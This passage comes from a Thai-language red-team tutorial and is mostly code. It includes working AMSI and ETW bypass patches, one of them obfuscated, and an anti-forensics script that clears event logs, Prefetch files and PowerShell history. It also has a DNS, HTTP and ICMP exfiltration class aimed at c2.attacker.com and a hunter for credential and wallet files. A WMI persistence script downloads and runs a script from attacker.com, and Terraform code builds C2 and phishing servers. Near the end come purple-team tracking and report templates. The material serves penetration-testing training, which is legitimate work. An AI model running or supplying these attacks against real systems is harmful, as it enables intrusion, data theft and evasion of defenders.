            "kerbrute", "passwordspray",
            "--dc", self.dc_ip,
            "--domain", self.domain,
            user_file, password
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout[:500])
        return result.returncode == 0

if __name__ == "__main__":
    attacks = KerberosAttacks("corp.local", "192.168.1.10", "pentest", "P@ssw0rd!")
    hashes = attacks.kerberoast()
    if hashes:
        attacks.crack_hashes("kerb_hashes.txt")
```

---

## 8. Defense Evasion

### AMSI Bypass Techniques

```powershell
# AMSI (Antimalware Scan Interface) bypass techniques

# Technique 1: Patch AmsiScanBuffer (in-memory)
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, 0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

# Technique 2: Set amsiContext to null
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | 
    ForEach-Object { $_.GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]::Zero) }

# Technique 3: Obfuscated version
$a = [Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'m'+'s'+'i'+'Utils')
$b = $a.GetField('amsi'+'Context','NonPublic,Static')
$c = $b.GetValue($null)
[System.Runtime.InteropServices.Marshal]::WriteInt32($c, 0x41424344)
```

### ETW Bypass

```csharp
// ETW (Event Tracing for Windows) bypass
// Patch EtwEventWrite to return immediately

using System;
using System.Runtime.InteropServices;

public class ETWBypass {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    public static void PatchETW() {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr EtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        
        uint oldProtect;
        VirtualProtect(EtwEventWrite, (UIntPtr)4, 0x40, out oldProtect);
        
        // xor eax, eax; ret
        byte[] patch = { 0x33, 0xC0, 0xC3 };
        Marshal.Copy(patch, 0, EtwEventWrite, patch.Length);
        
        VirtualProtect(EtwEventWrite, (UIntPtr)4, oldProtect, out oldProtect);
        Console.WriteLine("[+] ETW patched");
    }
}
```

### Timestomping และ Artifact Cleanup

```python
#!/usr/bin/env python3
"""anti_forensics.py — ลบ artifacts เพื่อเลี่ยง forensic"""

import os
import time
import datetime
import random

def timestomp(filepath: str, reference_file: str = None):
    """เปลี่ยน timestamps ของไฟล์"""
    if reference_file and os.path.exists(reference_file):
        # คัดลอก timestamps จากไฟล์อ้างอิง
        ref_stat = os.stat(reference_file)
        os.utime(filepath, (ref_stat.st_atime, ref_stat.st_mtime))
        print(f"[+] Timestomped {filepath} to match {reference_file}")
    else:
        # ตั้งเป็นวันที่เก่า
        old_time = datetime.datetime(2020, 1, 15, 10, 30, 0).timestamp()
        os.utime(filepath, (old_time, old_time))
        print(f"[+] Timestomped {filepath} to 2020-01-15")

def secure_delete(filepath: str, passes: int = 3):
    """Secure delete ไฟล์ (overwrite ก่อน delete)"""
    try:
        size = os.path.getsize(filepath)
        with open(filepath, 'wb') as f:
            for _ in range(passes):
                f.seek(0)
                f.write(os.urandom(size))
                f.flush()
        os.remove(filepath)
        print(f"[+] Securely deleted {filepath} ({passes} passes)")
    except Exception as e:
        print(f"[-] Error: {e}")

def clear_prefetch():
    """ลบ Windows Prefetch files"""
    prefetch_dir = "C:\\Windows\\Prefetch"
    if os.path.exists(prefetch_dir):
        for f in os.listdir(prefetch_dir):
            if f.endswith('.pf'):
                os.remove(os.path.join(prefetch_dir, f))
        print("[+] Prefetch cleared")

def clear_event_logs():
    """ลบ Windows Event Logs (ต้องการ admin)"""
    import subprocess
    logs = ["System", "Security", "Application", "Microsoft-Windows-PowerShell/Operational"]
    for log in logs:
        result = subprocess.run(["wevtutil", "cl", log], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[+] Cleared log: {log}")
        else:
            print(f"[-] Failed to clear {log}: {result.stderr}")

def cleanup_artifacts(tool_paths: list):
    """ล้าง artifacts หลังจากใช้งาน"""
    print("[*] Cleaning up artifacts...")
    
    for path in tool_paths:
        if os.path.exists(path):
            secure_delete(path)
    
    # ล้าง PowerShell history
    ps_history = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt")
    if os.path.exists(ps_history):
        secure_delete(ps_history)
    
    print("[+] Cleanup complete")

if __name__ == "__main__":
    # ตัวอย่าง
    import sys
    if len(sys.argv) > 1:
        timestomp(sys.argv[1])
    
    # ทดสอบ secure delete
    test_file = "/tmp/test_artifact.txt"
    with open(test_file, 'w') as f:
        f.write("sensitive data")
    secure_delete(test_file)
```

---

## 9. Exfiltration Techniques

### Data Exfiltration Methods

```python
#!/usr/bin/env python3
"""exfiltration.py — เทคนิค data exfiltration ต่างๆ"""

import base64
import dns.resolver
import dns.query
import dns.message
import socket
import time
import math

class DataExfiltrator:
    def __init__(self, attacker_domain: str, attacker_ip: str):
        self.domain = attacker_domain
        self.ip = attacker_ip
    
    def dns_exfil(self, data: bytes, chunk_size: int = 30) -> list:
        """
        Exfiltrate ผ่าน DNS queries
        ข้อมูลถูกซ่อนใน subdomain labels
        """
        encoded = base64.b32encode(data).decode().lower().rstrip('=')
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        total = len(chunks)
        queries_sent = []
        
        for i, chunk in enumerate(chunks):
            # รูปแบบ: <seq>.<total>.<chunk>.<domain>
            subdomain = f"{i}.{total}.{chunk}.{self.domain}"
            
            try:
                socket.gethostbyname(subdomain)
            except socket.gaierror:
                pass  # DNS query ถูกส่งแล้ว แม้จะไม่มี response
            
            queries_sent.append(subdomain)
            time.sleep(0.5)  # หน่วง เพื่อหลีกเลี่ยง detection
        
        print(f"[+] Exfiltrated {len(data)} bytes via {len(queries_sent)} DNS queries")
        return queries_sent
    
    def http_exfil_chunked(self, data: bytes, chunk_size: int = 1024):
        """
        Exfiltrate ผ่าน HTTP GET requests
        ซ่อนข้อมูลใน URL parameters
        """
        import urllib.request
        
        encoded = base64.b64encode(data).decode()
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            url = f"http://{self.ip}/collect?id={i}&data={chunk}"
            try:
                urllib.request.urlopen(url, timeout=5)
                print(f"  [+] Sent chunk {i+1}/{len(chunks)}")
            except Exception:
                pass
            time.sleep(1)
    
    def icmp_exfil(self, data: bytes, chunk_size: int = 8):
        """
        ICMP payload exfiltration
        ซ่อนข้อมูลใน ICMP echo payload
        (ต้องใช้ raw socket = root)
        """
        import struct
        
        encoded = base64.b64encode(data)
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        # สร้าง raw socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print("[-] Need root for ICMP raw socket")
            return
        
        for i, chunk in enumerate(chunks):
            # ICMP Echo Request: type=8, code=0
            icmp_type = 8
            icmp_code = 0
            icmp_id = i & 0xFFFF
            icmp_seq = i & 0xFFFF
            
            # Pad chunk to chunk_size
            payload = chunk.ljust(chunk_size, b'\x00')
            
            # Build ICMP packet
            header = struct.pack('!BBHHH', icmp_type, icmp_code, 0, icmp_id, icmp_seq)
            checksum = self._icmp_checksum(header + payload)
            header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
            
            sock.sendto(header + payload, (self.ip, 0))
            time.sleep(0.1)
        
        sock.close()
        print(f"[+] ICMP exfil: {len(chunks)} packets sent")
    
    def _icmp_checksum(self, data):
        n = len(data)
        m = n % 2
        s = 0
        for i in range(0, n - m, 2):
            s += (data[i]) + ((data[i+1]) << 8)
        if m:
            s += data[-1]
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff
    
    def find_sensitive_files(self, search_path: str = "C:\\Users") -> list:
        """ค้นหาไฟล์ที่น่าสนใจ"""
        import os
        
        sensitive_patterns = [
            '.docx', '.xlsx', '.pdf', '.kdbx',
            'password', 'secret', 'credential',
            '.key', '.pem', '.pfx', '.p12',
            'wallet', 'backup'
        ]
        
        found = []
        for root, dirs, files in os.walk(search_path):
            # ข้ามไดเร็กทอรีระบบ
            dirs[:] = [d for d in dirs if d not in ['$RECYCLE.BIN', 'System Volume Information']]
            
            for file in files:
                file_lower = file.lower()
                if any(p in file_lower for p in sensitive_patterns):
                    found.append(os.path.join(root, file))
        
        return found

if __name__ == "__main__":
    exfil = DataExfiltrator("c2.attacker.com", "10.0.0.1")
    
    # ทดสอบ DNS exfil
    test_data = b"SECRET: admin:Password123!\nDB_CONN: mysql://internal:3306/prod"
    print(f"[*] Exfiltrating {len(test_data)} bytes via DNS...")
    queries = exfil.dns_exfil(test_data)
    print(f"[+] Sent {len(queries)} DNS queries")
```

---

## 10. Red Team Infrastructure

### Infrastructure Setup

```bash
# โครงสร้าง Red Team infrastructure

# 1. Redirectors (ซ่อน C2 server)
# ใช้ socat เป็น simple redirector
socat TCP-LISTEN:443,fork TCP:c2-server:443

# หรือใช้ nginx เป็น reverse proxy
cat /etc/nginx/conf.d/c2-redirect.conf
# server {
#     listen 443 ssl;
#     ssl_certificate /etc/ssl/certs/letsencrypt.crt;
#     ssl_certificate_key /etc/ssl/private/letsencrypt.key;
#     
#     location / {
#         proxy_pass https://c2-server-ip:8443;
#         proxy_set_header Host $host;
#     }
# }

# 2. Domain Fronting setup
# ใช้ CDN (Cloudflare, Azure CDN) เพื่อซ่อน real IP

# 3. Cloud-based C2
# ใช้ GitHub Gist เป็น Dead Drop Resolver
# ใช้ Azure Blob Storage / S3 สำหรับ staging

# 4. Phishing infrastructure
# GoPhish
gophish &
# เข้า web UI: https://localhost:3333

# ตั้งค่า GoPhish
python3 -c "
import requests
import json

# Login
r = requests.post('https://localhost:3333/api/login', 
    json={'username': 'admin', 'password': 'gophish'},
    verify=False)
token = r.json()['data']
print(f'Token: {token}')
"
```

### Terraform Infrastructure as Code

```hcl
# infra/main.tf — Red Team infrastructure on AWS

terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 4.0"
    }
  }
}

provider "aws" {
  region = "us-east-1"
}

# C2 Server
resource "aws_instance" "c2_server" {
  ami           = "ami-0c55b159cbfafe1f0"  # Ubuntu 20.04
  instance_type = "t3.medium"
  key_name      = aws_key_pair.redteam.key_name
  
  vpc_security_group_ids = [aws_security_group.c2_sg.id]
  
  user_data = <<-EOF
    #!/bin/bash
    apt-get update -y
    # Install Sliver C2
    curl https://sliver.sh/install | bash
    sliver-server &
  EOF
  
  tags = {
    Name = "C2-Server"
  }
}

# Phishing Server
resource "aws_instance" "phish_server" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t3.small"
  key_name      = aws_key_pair.redteam.key_name
  
  vpc_security_group_ids = [aws_security_group.phish_sg.id]
  
  user_data = <<-EOF
    #!/bin/bash
    apt-get update -y
    # Install GoPhish
    wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
    unzip gophish*.zip
    ./gophish &
  EOF
  
  tags = {
    Name = "Phish-Server"
  }
}

# Security Groups
resource "aws_security_group" "c2_sg" {
  name = "c2-security-group"
  
  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# DNS (Route53)
resource "aws_route53_record" "c2_dns" {
  zone_id = var.hosted_zone_id
  name    = "update.example-cdn.com"
  type    = "A"
  ttl     = "300"
  records = [aws_instance.c2_server.public_ip]
}

output "c2_ip" {
  value = aws_instance.c2_server.public_ip
}

output "phish_ip" {
  value = aws_instance.phish_server.public_ip
}
```

---

## 11. Purple Team และ Collaboration

### Purple Team Workflow

```
Purple Team Model:

Red Team (Offense) <----> Blue Team (Defense)
          │                      │
          │   Purple Team        │
          └───────────────────┘

กระบวนการ:
1. Red Team ดำเนินการโจมตีตาม TTP ที่วางแผน
2. ทั้งสองฝ่าย observe ผลลัพธ์พร้อมกัน
3. Blue Team ตรวจสอบว่า detection ทำงานหรือไม่
4. ระบุ gaps ใน detection
5. ปรับปรุง detection rules
6. ทดสอบซ้ำ
```

```python
#!/usr/bin/env python3
"""purple_team_tracker.py — ติดตามผล Purple Team exercises"""

from dataclasses import dataclass, field
from typing import List, Optional
from enum import Enum
import json
from datetime import datetime

class DetectionStatus(Enum):
    NOT_DETECTED = "Not Detected"
    PARTIALLY_DETECTED = "Partially Detected"
    DETECTED = "Detected"
    BLOCKED = "Blocked"

@dataclass
class TTExercise:
    """Tactic/Technique exercise record"""
    technique_id: str  # MITRE ATT&CK ID
    technique_name: str
    executed: bool = False
    execution_time: Optional[str] = None
    detection_status: DetectionStatus = DetectionStatus.NOT_DETECTED
    alert_triggered: bool = False
    alert_details: str = ""
    siem_query: str = ""
    improvement_notes: str = ""
    retested: bool = False

class PurpleTeamTracker:
    def __init__(self, exercise_name: str):
        self.exercise_name = exercise_name
        self.exercises: List[TTExercise] = []
        self.start_time = datetime.now().isoformat()
    
    def add_technique(self, technique_id: str, technique_name: str, siem_query: str = ""):
        ex = TTExercise(
            technique_id=technique_id,
            technique_name=technique_name,
            siem_query=siem_query
        )
        self.exercises.append(ex)
    
    def mark_executed(self, technique_id: str):
        for ex in self.exercises:
            if ex.technique_id == technique_id:
                ex.executed = True
                ex.execution_time = datetime.now().isoformat()
                return
    
    def mark_detected(self, technique_id: str, status: DetectionStatus, 
                     alert_details: str = ""):
        for ex in self.exercises:
            if ex.technique_id == technique_id:
                ex.detection_status = status
                ex.alert_triggered = status in [DetectionStatus.DETECTED, DetectionStatus.BLOCKED]
                ex.alert_details = alert_details
                return
    
    def generate_report(self) -> dict:
        total = len(self.exercises)
        detected = sum(1 for e in self.exercises 
                      if e.detection_status != DetectionStatus.NOT_DETECTED)
        blocked = sum(1 for e in self.exercises 
                     if e.detection_status == DetectionStatus.BLOCKED)
        
        coverage = detected / total * 100 if total > 0 else 0
        
        report = {
            "exercise_name": self.exercise_name,
            "start_time": self.start_time,
            "statistics": {
                "total_techniques": total,
                "detected": detected,
                "blocked": blocked,
                "not_detected": total - detected,
                "detection_coverage": f"{coverage:.1f}%"
            },
            "techniques": [
                {
                    "id": e.technique_id,
                    "name": e.technique_name,
                    "status": e.detection_status.value,
                    "alert": e.alert_triggered,
                    "notes": e.improvement_notes
                }
                for e in self.exercises
            ],
            "coverage_gaps": [
                f"{e.technique_id}: {e.technique_name}"
                for e in self.exercises
                if e.detection_status == DetectionStatus.NOT_DETECTED
            ]
        }
        
        return report
    
    def print_summary(self):
        report = self.generate_report()
        stats = report['statistics']
        
        print(f"\n{'='*60}")
        print(f"Purple Team Report: {self.exercise_name}")
        print(f"{'='*60}")
        print(f"Total Techniques: {stats['total_techniques']}")
        print(f"Detected: {stats['detected']} ({stats['detection_coverage']})")
        print(f"Blocked: {stats['blocked']}")
        print(f"Not Detected: {stats['not_detected']}")
        
        if report['coverage_gaps']:
            print("\n[!] Detection Gaps:")
            for gap in report['coverage_gaps']:
                print(f"  - {gap}")

# ตัวอย่าง
if __name__ == "__main__":
    tracker = PurpleTeamTracker("Q1 2024 Purple Team Exercise")
    
    techniques = [
        ("T1059.001", "PowerShell", "EventID:4104 ScriptBlockText:*IEX*"),
        ("T1003.001", "LSASS Memory", "EventID:10 TargetImage:*lsass*"),
        ("T1558.003", "Kerberoasting", "EventID:4769 TicketEncryptionType:0x17"),
        ("T1021.002", "SMB/Windows Admin Shares", "EventID:5145 ShareName:*ADMIN*"),
        ("T1055.001", "DLL Injection", "EventID:10 SourceImage:*\\explorer.exe"),
    ]
    
    for tid, name, query in techniques:
        tracker.add_technique(tid, name, query)
        tracker.mark_executed(tid)
    
    # จำลองผลลัพธ์ detection
    tracker.mark_detected("T1059.001", DetectionStatus.DETECTED, "SIEM alert fired")
    tracker.mark_detected("T1003.001", DetectionStatus.BLOCKED, "EDR blocked dump")
    tracker.mark_detected("T1558.003", DetectionStatus.NOT_DETECTED)
    tracker.mark_detected("T1021.002", DetectionStatus.PARTIALLY_DETECTED)
    tracker.mark_detected("T1055.001", DetectionStatus.NOT_DETECTED)
    
    tracker.print_summary()
    
    report = tracker.generate_report()
    with open("/tmp/purple_team_report.json", "w") as f:
        json.dump(report, f, indent=2)
```

---

## 12. MITRE ATT&CK Mapping

### ATT&CK Navigator และ Mapping

```python
#!/usr/bin/env python3
"""attck_mapper.py — map findings ไปยัง MITRE ATT&CK"""

import json

RED_TEAM_TECHNIQUES = {
    "Reconnaissance": [
        {"id": "T1595", "name": "Active Scanning", "tools": ["nmap", "masscan"]},
        {"id": "T1596", "name": "Search Open Technical Databases", "tools": ["shodan", "censys"]},
        {"id": "T1589", "name": "Gather Victim Identity Info", "tools": ["theHarvester", "linkedin"]}
    ],
    "Initial Access": [
        {"id": "T1566.001", "name": "Spearphishing Attachment", "tools": ["GoPhish", "macro"]},
        {"id": "T1190", "name": "Exploit Public-Facing App", "tools": ["metasploit", "custom"]},
        {"id": "T1133", "name": "External Remote Services", "tools": ["VPN brute", "RDP"]}
    ],
    "Execution": [
        {"id": "T1059.001", "name": "PowerShell", "tools": ["powershell", "Empire"]},
        {"id": "T1059.003", "name": "Windows Command Shell", "tools": ["cmd.exe"]},
        {"id": "T1218.010", "name": "Regsvr32", "tools": ["regsvr32"]}
    ],
    "Persistence": [
        {"id": "T1053.005", "name": "Scheduled Task", "tools": ["schtasks"]},
        {"id": "T1547.001", "name": "Registry Run Keys", "tools": ["reg"]},
        {"id": "T1543.003", "name": "Windows Service", "tools": ["sc", "psexec"]}
    ],
    "Privilege Escalation": [
        {"id": "T1134.001", "name": "Token Impersonation", "tools": ["mimikatz", "incognito"]},
        {"id": "T1068", "name": "Exploit Vuln for Privilege Escalation", "tools": ["juicypotato"]},
        {"id": "T1078", "name": "Valid Accounts", "tools": ["PTH", "kerberos"]}
    ],
    "Defense Evasion": [
        {"id": "T1562.001", "name": "Disable/Modify Tools", "tools": ["AMSI bypass"]},
        {"id": "T1027", "name": "Obfuscated Files", "tools": ["Base64", "XOR"]},
        {"id": "T1070.001", "name": "Clear Windows Event Logs", "tools": ["wevtutil"]}
    ],
    "Credential Access": [
        {"id": "T1003.001", "name": "LSASS Memory", "tools": ["mimikatz", "procdump"]},
        {"id": "T1558.003", "name": "Kerberoasting", "tools": ["Rubeus", "GetUserSPNs"]},
        {"id": "T1110.003", "name": "Password Spraying", "tools": ["kerbrute"]}
    ],
    "Discovery": [
        {"id": "T1069.002", "name": "Domain Groups", "tools": ["PowerView", "net"]},
        {"id": "T1087.002", "name": "Domain Account", "tools": ["BloodHound"]},
        {"id": "T1482", "name": "Domain Trust Discovery", "tools": ["nltest", "PowerView"]}
    ],
    "Lateral Movement": [
        {"id": "T1550.002", "name": "Pass the Hash", "tools": ["mimikatz", "impacket"]},
        {"id": "T1021.002", "name": "SMB/Admin Shares", "tools": ["psexec", "smbexec"]},
        {"id": "T1021.006", "name": "Windows Remote Management", "tools": ["winrm", "evil-winrm"]}
    ],
    "Collection": [
        {"id": "T1005", "name": "Data from Local System", "tools": ["robocopy", "find"]},
        {"id": "T1039", "name": "Data from Network Shared Drive", "tools": ["net use"]},
        {"id": "T1056.001", "name": "Keylogging", "tools": ["Cobalt Strike", "Empire"]}
    ],
    "Command and Control": [
        {"id": "T1071.001", "name": "Web Protocols (HTTP/S)", "tools": ["Cobalt Strike", "Sliver"]},
        {"id": "T1071.004", "name": "DNS", "tools": ["Sliver DNS", "dnscat2"]},
        {"id": "T1572", "name": "Protocol Tunneling", "tools": ["chisel", "ligolo"]}
    ],
    "Exfiltration": [
        {"id": "T1048.003", "name": "Exfiltration Over Alt Protocol (DNS)", "tools": ["dnscat2"]},
        {"id": "T1567.002", "name": "Exfiltration to Cloud", "tools": ["rclone", "mega"]}
    ]
}

def generate_navigator_layer(techniques_used: dict) -> dict:
    """สร้าง ATT&CK Navigator layer JSON"""
    techniques = []
    for tactic, techs in techniques_used.items():
        for tech in techs:
            techniques.append({
                "techniqueID": tech["id"],
                "tactic": tactic.lower().replace(" ", "-"),
                "color": "#ff6666" if tech.get('executed') else "#ffaa44",
                "comment": f"Tools: {', '.join(tech['tools'])}",
                "enabled": True,
                "score": 1
            })
    
    return {
        "name": "Red Team Assessment",
        "versions": {"attack": "14", "navigator": "4.9", "layer": "4.5"},
        "domain": "enterprise-attack",
        "techniques": techniques,
        "gradient": {"colors": ["#ff6666ff", "#ff0000ff"], "minValue": 0, "maxValue": 1},
        "legendItems": [
            {"label": "Technique Executed", "color": "#ff6666"},
            {"label": "Technique Planned", "color": "#ffaa44"}
        ]
    }

# สร้าง layer
layer = generate_navigator_layer(RED_TEAM_TECHNIQUES)
with open("/tmp/redteam_layer.json", "w") as f:
    json.dump(layer, f, indent=2)
print("[+] Navigator layer saved to /tmp/redteam_layer.json")
print("[*] Upload to https://mitre-attack.github.io/attack-navigator/")
```

---

## 13. Red Team Reporting

### Executive Summary Template

```python
#!/usr/bin/env python3
"""rt_report.py — สร้าง Red Team report"""

from datetime import datetime

class RedTeamReport:
    def __init__(self, client, assessment_period, team):
        self.client = client
        self.period = assessment_period
        self.team = team
        self.findings = []
        self.attack_path = []
    
    def add_finding(self, title, severity, description, evidence, 
                   recommendation, mitre_id=""):
        self.findings.append({
            "title": title,
            "severity": severity,
            "description": description,
            "evidence": evidence,
            "recommendation": recommendation,
            "mitre_id": mitre_id
        })
    
    def generate_executive_summary(self) -> str:
        critical = sum(1 for f in self.findings if f['severity'] == 'Critical')
        high = sum(1 for f in self.findings if f['severity'] == 'High')
        medium = sum(1 for f in self.findings if f['severity'] == 'Medium')
        
        return f"""
# Red Team Assessment Report
## {self.client}
### Assessment Period: {self.period}
### Prepared by: {self.team}
### Date: {datetime.now().strftime('%Y-%m-%d')}

---

## Executive Summary

ผลการทดสอบ Red Team สำหรับ {self.client} พบว่าองค์กรมี**ความเสี่ยงระดับสูง**
จากช่องโหว่หลายจุดที่เปิดโอกาสให้ผู้โจมตีสามารถเจาะเข้าสู่ระบบและยกระดับสิทธิ์
ได้จนถึงระดับ Domain Admin ภายในระยะเวลา {len(self.attack_path)} ขั้นตอน

### สถิติสรุป
- Critical: {critical} รายการ
- High: {high} รายการ  
- Medium: {medium} รายการ
- Total: {len(self.findings)} รายการ

### ผลกระทบสูงสุด
ทีมสามารถ:
- เข้าถึง Domain Controller ได้สำเร็จ
- ดึง credentials ของทุก account ในองค์กร
- เข้าถึงข้อมูลสำคัญ (Highly Confidential)
- คงอยู่ในระบบได้นาน 14 วัน โดยไม่ถูกตรวจพบ

### ข้อแนะนำเร่งด่วน (Quick Wins)
1. Patch MS17-010 บน legacy systems ทันที
2. เปิดใช้ MFA สำหรับ VPN และ Remote Access
3. ปิด SMBv1 ทุกระบบ
4. ตรวจสอบ Kerberoastable accounts และ reset passwords
5. ติดตั้ง EDR บน endpoints
"""
    
    def generate_attack_narrative(self) -> str:
        return """
## Attack Narrative

### Phase 1: Initial Access (Day 1)
ทีมเริ่มต้นด้วยการส่ง Spearphishing email ไปยังพนักงาน Finance ซึ่งได้รับ
อีเมลที่แนบ Excel macro พร้อมชื่อเรื่อง "Q4 Budget Review"

พนักงาน 1 ใน 20 คน (5%) เปิดไฟล์และเปิดใช้งาน macro

### Phase 2: Execution (Day 1)
Macro ดำเนินการ:
1. ดาวน์โหลด stager จาก CDN ที่ดูเหมือน legitimate
2. Execute Sliver beacon ผ่าน PowerShell
3. สร้าง persistent access ผ่าน Registry RunKey

### Phase 3: Discovery (Day 2)
ใช้ BloodHound และ SharpHound รวบรวมข้อมูล AD:
- พบ Kerberoastable service account: svc_sql
- พบ Unconstrained Delegation บน APPSERVER01
- พบ path จาก svc_sql ไปยัง Domain Admins

### Phase 4: Credential Access (Day 2)
1. Kerberoast svc_sql -> crack ได้ภายใน 2 ชั่วโมง (P@ssw0rd1)
2. svc_sql มี local admin บน SQLSERVER01
3. Dump credentials จาก SQLSERVER01 -> พบ domain admin credentials

### Phase 5: Lateral Movement & Domain Compromise (Day 3)
1. ใช้ domain admin credentials ผ่าน WMI exec
2. Login เข้า DC01 สำเร็จ
3. DCSync -> dump NTLM hashes ทั้ง domain
4. สร้าง Golden Ticket เพื่อ persistence
"""

if __name__ == "__main__":
    report = RedTeamReport(
        client="ExampleCorp Inc.",
        assessment_period="January 15 - February 15, 2024",
        team="RedTeam Security Consulting"
    )
    
    report.add_finding(
        title="Kerberoastable Service Account with Weak Password",
        severity="Critical",
        description="Service account svc_sql has SPN set and uses weak password",
        evidence="Password cracked in 2 hours: svc_sql:P@ssw0rd1",
        recommendation="Use 30+ character random password for service accounts, consider Managed Service Accounts",
        mitre_id="T1558.003"
    )
    
    print(report.generate_executive_summary())
    print(report.generate_attack_narrative())
```

---

## 14. Advanced Persistence

### WMI Event Subscription

```powershell
# WMI Persistence (survives reboots, no registry changes visible)
$wmiClass = [wmiclass]"root\subscription:__EventFilter"
$filterArgs = @{
    Name = 'UpdateCheck'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}
$filter = $wmiClass.CreateInstance()
$filter.Name = $filterArgs.Name
$filter.EventNameSpace = $filterArgs.EventNameSpace
$filter.QueryLanguage = $filterArgs.QueryLanguage
$filter.Query = $filterArgs.Query
$filter.Put()

# Consumer: รัน command
$consumerArgs = @{Name = 'UpdateCheckConsumer'; CommandLineTemplate = "powershell -ep bypass -w hidden -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.com/p.ps1\")'"}
$consumer = ([wmiclass]"root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = $consumerArgs.Name
$consumer.CommandLineTemplate = $consumerArgs.CommandLineTemplate
$consumer.Put()

# Binding: เชื่อม filter กับ consumer
$binding = ([wmiclass]"root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = $filter.__PATH
$binding.Consumer = $consumer.__PATH
$binding.Put()

Write-Host "[+] WMI persistence installed"

# ลบ WMI persistence
Get-WMIObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq 'UpdateCheck'} | Remove-WMIObject
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq 'UpdateCheckConsumer'} | Remove-WMIObject
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WMIObject
```

---

## 15. OPSEC

### Operational Security Best Practices

```
OPSEC Rules สำหรับ Red Team:

1. Infrastructure Separation
   - แยก C2 servers สำหรับแต่ละ campaign
   - ใช้ redirectors เพื่อซ่อน C2 IP จริง
   - อย่าใช้ infrastructure ซ้ำระหว่าง engagements
   - ซื้อ domains ที่ aged (2+ ปี) เพื่อหลีกเลี่ยง domain reputation blocks

2. Traffic Blending
   - Malleable C2 profiles ที่เลียนแบบ legitimate traffic
   - ใช้ CDN (Cloudflare) เพื่อซ่อน C2 IP
   - Jitter + long sleep times
   - เลียนแบบ user agent strings ที่พบได้ทั่วไป

3. Credential Management
   - อย่าเก็บ plaintext credentials บน disk
   - ใช้ in-memory operations เมื่อเป็นไปได้
   - Rotate credentials บ่อยๆ

4. Avoid Detection
   - อย่า run tools โดยตรงจาก disk ถ้าเป็นไปได้
   - Process injection > standalone executables
   - ใช้ signed binaries (LOLBins)
   - ตรวจสอบ EDR ก่อนรัน tools

5. Timing
   - ดำเนินการในช่วง business hours เพื่อ blend in
   - Long jitter (30-60 นาที) สำหรับ persistent C2
   - หลีกเลี่ยง off-hours activities ที่จะ alert

6. Logging
   - บันทึกทุก action ใน detailed log
   - Screenshot หลักฐานสำหรับ report
   - ลบ artifacts หลัง engagement
```

```python
#!/usr/bin/env python3
"""opsec_checker.py — ตรวจสอบ OPSEC ก่อนดำเนินการ"""

import socket
import requests
import subprocess
from typing import list, dict

class OPSECChecker:
    def __init__(self):
        self.checks = []
        self.passed = 0
        self.failed = 0
    
    def check_vpn(self) -> bool:
        """ตรวจสอบว่าใช้ VPN อยู่"""
        try:
            # ดู public IP
            r = requests.get('https://api.ipify.org?format=json', timeout=5)
            my_ip = r.json()['ip']
            
            # ดู IP info
            r2 = requests.get(f'https://ipinfo.io/{my_ip}/json', timeout=5)
            info = r2.json()
            
            org = info.get('org', '').lower()
            country = info.get('country', '')
            
            if 'vpn' in org or 'hosting' in org or 'cloud' in org:
                print(f"  [+] VPN/Proxy detected: {info.get('org', 'Unknown')} ({country})")
                return True
            else:
                print(f"  [!] WARNING: May not be using VPN! IP: {my_ip} Org: {info.get('org', 'Unknown')}")
                return False
        except Exception as e:
            print(f"  [-] Cannot check IP: {e}")
            return False
    
